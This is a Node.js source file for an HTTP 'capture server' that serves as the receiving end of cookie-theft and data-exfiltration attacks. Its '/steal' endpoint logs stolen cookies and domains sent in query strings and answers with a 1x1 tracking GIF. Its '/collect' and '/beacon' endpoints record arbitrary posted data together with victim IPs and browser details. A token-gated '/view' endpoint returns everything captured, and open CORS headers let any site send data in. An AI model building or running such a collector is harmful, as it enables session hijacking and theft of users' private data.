const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8888;
const VIEW_TOKEN = process.env.VIEW_TOKEN || 'tv-capture-collector';
const TS = () => new Date().toISOString();

const GIF1x1 = Buffer.from(
  'R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==',
  'base64'
);

let memory = [];

function save(record) {
  memory.push(record);
  const files = [
    path.join(__dirname, 'captures.log'),
    '/tmp/captures.log'
  ];
  for (const f of files) {
    try { fs.appendFileSync(f, JSON.stringify(record) + '\n'); } catch (e) {}
  }
  console.log('[CAPTURE]', JSON.stringify(record));
}

function readAll() {
  const out = [...memory];
  for (const f of [path.join(__dirname, 'captures.log'), '/tmp/captures.log']) {
    try {
      const c = fs.readFileSync(f, 'utf8');
      if (c) {
        for (const line of c.trim().split('\n')) {
          try { out.push(JSON.parse(line)); } catch (e) {}
        }
      }
    } catch (e) {}
  }
  return out;
}

function cors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://localhost');
  cors(res);

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  if (url.pathname === '/steal') {
    const record = {
      type: 'pixel',
      timestamp: TS(),
      source_ip: req.socket.remoteAddress,
      domain: url.searchParams.get('d') || '',
      cookie: url.searchParams.get('c') || '',
      referer: req.headers.referer || '',
      ua: req.headers['user-agent'] || ''
    };
    save(record);
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(GIF1x1);
    return;
  }

  if (url.pathname === '/collect' || url.pathname === '/beacon') {
    let body = '';
    req.on('data', c => { body += c; });
    req.on('end', () => {
      let parsed = body;
      try { parsed = JSON.parse(body); } catch (e) {}
      const record = {
        type: url.pathname.slice(1),
        timestamp: TS(),
        source_ip: req.socket.remoteAddress,
        data: parsed,
        referer: req.headers.referer || '',
        ua: req.headers['user-agent'] || ''
      };
      save(record);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"status":"ok"}');
    });
    return;
  }

  if (url.pathname === '/view' || url.pathname === '/') {
    if (url.searchParams.get('token') !== VIEW_TOKEN) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end('{"error":"forbidden"}');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(readAll(), null, 2));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end('{"error":"not found"}');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('Capture server listening on port ' + PORT);
  console.log('Endpoints: /steal  /collect  /beacon  /view?token=...');
});